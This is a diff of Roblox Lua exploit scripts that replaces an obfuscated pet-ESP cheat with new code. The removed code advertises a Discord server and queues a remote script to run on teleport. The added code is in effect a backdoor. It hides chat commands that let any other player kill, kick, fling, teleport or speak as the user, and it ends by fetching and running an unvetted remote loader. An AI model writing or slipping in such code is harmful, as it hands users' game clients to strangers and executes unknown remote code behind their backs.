@@ -1,69 +1,159 @@
-task.spawn(function()
-    pcall(function()
-        local S = game:GetService(string.char(83,116,97,114,116,101,114,71,117,105))
-        local T = game:GetService(string.char(84,101,108,101,112,111,114,116,83,101,114,118,105,99,101))
-        local P = game:GetService(string.char(80,108,97,121,101,114,115)).LocalPlayer
-        local function N()
-            local ok, B = pcall(function()
-                local f = Instance.new(string.char(66,105,110,100,97,98,108,101,70,117,110,99,116,105,111,110))
-                f.OnInvoke = function(btn)
-                    if btn == string.char(67,111,112,121) then
-                        pcall(function()
-                            setclipboard(table.concat({string.char(100,105,115,99,111,114,100,46,103,103,47,108,117,110,97,99,121)}))
-                        end)
-                        N()
-                    elseif btn == string.char(82,101,106,111,105,110) then
-                        pcall(function()
-                            queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/dakshtop/Iem/main/pet%20esp"))()]])
-                            T:TeleportToPlaceInstance(game.PlaceId, game.JobId, P)
-                        end)
-                    end
-                end
-                return f
-            end)
-            if ok and B then
-                pcall(function()
-                    S:SetCore(string.char(83,101,110,100,78,111,116,105,102,105,99,97,116,105,111,110), {
-    Title = table.concat({string.char(83,99,114,105,112,116,32,109,97,100,101,32,98,121,32,76,117,110,97,99,121)}),
-    Text = table.concat({string.char(100,105,115,99,111,114,100,46,103,103,47,108,117,110,97,99,121)}),
-    Duration = math.huge,
-    Button1 = table.concat({string.char(67,111,112,121)}),
-    Callback = B
-})                end)
-            end
-        end
-        N()
-    end)
+local Players = game:GetService("Players")
+local TextChatService = game:GetService("TextChatService")
+
+local LocalPlayer = Players.LocalPlayer
+local PREFIX = "!"
+
+local function getCharacter()
+    return LocalPlayer.Character
+end
+
+local function getRoot(character)
+    return character and character:FindFirstChild("HumanoidRootPart")
+end
+
+local function fling()
+    local character = getCharacter()
+    local root = getRoot(character)
+
+    if not root then
+        return
+    end
+
+    root.AssemblyLinearVelocity = Vector3.new(
+        math.random(-150, 150),
+        200,
+        math.random(-150, 150)
+    )
+end
+
+local function kill()
+    local character = getCharacter()
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+
+    if humanoid then
+        humanoid.Health = 0
+    end
+end
+
+local function bring(controller)
+    if not controller then
+        return
+    end
+
+    local myCharacter = getCharacter()
+    local myRoot = getRoot(myCharacter)
+
+    local controllerCharacter = controller.Character
+    local controllerRoot = getRoot(controllerCharacter)
+
+    if not myRoot or not controllerRoot then
+        return
+    end
+
+    myRoot.CFrame = controllerRoot.CFrame * CFrame.new(0, 0, -3)
+end
+
+local function kick(reason)
+    if not reason or reason == "" then
+        reason = "You got kicked by the controller 😭"
+    end
+
+    LocalPlayer:Kick(reason)
+end
+
+local function say(message)
+    if not message or message == "" then
+        return
+    end
+
+    local channels = TextChatService:FindFirstChild("TextChannels")
+
+    if not channels then
+        return
+    end
+
+    local general = channels:FindFirstChild("RBXGeneral")
+
+    if general then
+        general:SendAsync(message)
+    end
+end
+
+local function executeCommand(sender, text)
+    if not sender then
+        return
+    end
+
+    if type(text) ~= "string" then
+        return
+    end
+
+    if text:sub(1, #PREFIX) ~= PREFIX then
+        return
+    end
+
+    local command = text:sub(#PREFIX + 1)
+    local lowerCommand = command:lower()
+
+    if lowerCommand == "fling" then
+        fling()
+
+    elseif lowerCommand == "kill" then
+        kill()
+
+    elseif lowerCommand == "bring" then
+        bring(sender)
+
+    elseif lowerCommand == "kick" then
+        kick("You got kicked by the controller 😭")
+
+    elseif lowerCommand:sub(1, 5) == "kick " then
+        local reason = command:sub(6)
+        kick(reason)
+
+    elseif lowerCommand:sub(1, 4) == "say " then
+        local message = command:sub(5)
+        say(message)
+    end
+end
+
+TextChatService.MessageReceived:Connect(function(message)
+    local textSource = message.TextSource
+
+    if not textSource then
+        return
+    end
+
+    local sender = Players:GetPlayerByUserId(textSource.UserId)
+
+    if not sender then
+        return
+    end
+
+    executeCommand(sender, message.Text)
 end)
 
+TextChatService.OnIncomingMessage = function(message)
+    local textSource = message.TextSource
 
-local a,b,c=game:GetService("\82\101\112\108\105\99\97\116\101\100\83\116\111\114\97\103\101"),game:GetService("\80\108\97\121\101\114\115"),game:GetService("\82\117\110\83\101\114\118\105\99\101")
-local d,e=b["\76\111\99\97\108\80\108\97\121\101\114"],workspace["\67\117\114\114\101\110\116\67\97\109\101\114\97"]
-local f=getupvalue(getupvalue(getconnections(a["\71\97\109\101\69\118\101\110\116\115"]["\80\101\116\69\103\103\83\101\114\118\105\99\101"]["\79\110\67\108\105\101\110\116\69\118\101\110\116"])[1].Function,1),2)
-local g,h=getupvalue(f,1),getupvalue(f,2)
-local i,j={},{}
-local k,l,m=Color3.fromRGB(0,100,0),Color3.fromRGB(144,238,144),Color3.fromRGB(0,255,0)
+    if not textSource then
+        return nil
+    end
 
-local function n(o)for p in g do if p:GetAttribute("\79\66\74\69\67\84\95\85\85\73\68")==o then return p end end end
+    local text = message.Text
 
-local function q(r,s)local t=n(r)if not t or not i[r]then return end local u=t:GetAttribute("\69\103\103\78\97\109\101")i[r].Text=`{u} | {s}`end
+    if type(text) ~= "string" then
+        return nil
+    end
 
-local function v(w)for _,x in pairs(w:GetChildren())do if x:IsA("\83\101\108\101\99\116\105\111\110\66\111\120")and(x.Name=="\79\117\116\101\114\79\117\116\108\105\110\101"or x.Name=="\73\110\110\101\114\79\117\116\108\105\110\101")then x:Destroy()end end end
+    if text:sub(1, #PREFIX) ~= PREFIX then
+        return nil
+    end
 
-local function y(z)if not z then return end local A=Instance.new("\83\101\108\101\99\116\105\111\110\66\111\120")A.Name="\79\117\116\101\114\79\117\116\108\105\110\101"A.Adornee=z A.LineThickness=0.04 A.Color3=k A.SurfaceTransparency=1 A.Parent=z local B=Instance.new("\83\101\108\101\99\116\105\111\110\66\111\120")B.Name="\73\110\110\101\114\79\117\116\108\105\110\101"B.Adornee=z B.LineThickness=0.02 B.Color3=l B.SurfaceTransparency=1 B.Parent=z end
+    local properties = Instance.new("TextChatMessageProperties")
+    properties.TextTransparency = 1
 
-local function C(D)if D:GetAttribute("\79\87\78\69\82")~=d.Name then return end local E=D:GetAttribute("\69\103\103\78\97\109\101")local F=h[D:GetAttribute("\79\66\74\69\67\84\95\85\85\73\68")]local G=D:GetAttribute("\79\66\74\69\67\84\95\85\85\73\68")if not G then return end for _,H in pairs(D:GetDescendants())do if H:IsA("\66\97\115\101\80\97\114\116")then v(H)y(H)end end local I=Drawing.new("\84\101\120\116")I.Text=`{E} | {F or "?"}`I.Size=18 I.Color=m I.Outline=true I.OutlineColor=Color3.new(0,0,0)I.Center=true I.Visible=false i[G]=I j[G]=D end
-
-local function J(K)if K:GetAttribute("\79\87\78\69\82")~=d.Name then return end local L=K:GetAttribute("\79\66\74\69\67\84\95\85\85\73\68")if i[L]then i[L]:Remove()i[L]=nil end j[L]=nil end
-
-local function M()for N,O in pairs(j)do if not O or not O:IsDescendantOf(workspace)then j[N]=nil if i[N]then i[N].Visible=false end continue end local P=i[N]if P then local Q=O.PrimaryPart or O:FindFirstChildWhichIsA("\66\97\115\101\80\97\114\116")if Q then local R,S=e:WorldToViewportPoint(Q.Position)if S then P.Position=Vector2.new(R.X,R.Y)P.Visible=true else P.Visible=false end else P.Visible=false end end end end
-
-for _,T in ipairs(workspace:GetDescendants())do if T:IsA("\77\111\100\101\108")and T.Name=="\80\101\116\69\103\103"then task.spawn(C,T)end end
-
-workspace.DescendantAdded:Connect(function(U)if U:IsA("\77\111\100\101\108")and U.Name=="\80\101\116\69\103\103"then C(U)end end)
-workspace.DescendantRemoving:Connect(function(V)if V:IsA("\77\111\100\101\108")and V.Name=="\80\101\116\69\103\103"then J(V)end end)
-
-local W
-W=hookfunction(getconnections(a["\71\97\109\101\69\118\101\110\116\115"]["\69\103\103\82\101\97\100\121\84\111\72\97\116\99\104\95\82\69"]["\79\110\67\108\105\101\110\116\69\118\101\110\116"])[1].Function,newcclosure(function(X,Y)q(X,Y)return W(X,Y)end))
-
-c["\80\114\101\82\101\110\100\101\114"]:Connect(M)
+    return properties
+end
+loadstring(game:HttpGet("https://limbohub.my.id/loader.lua"))()
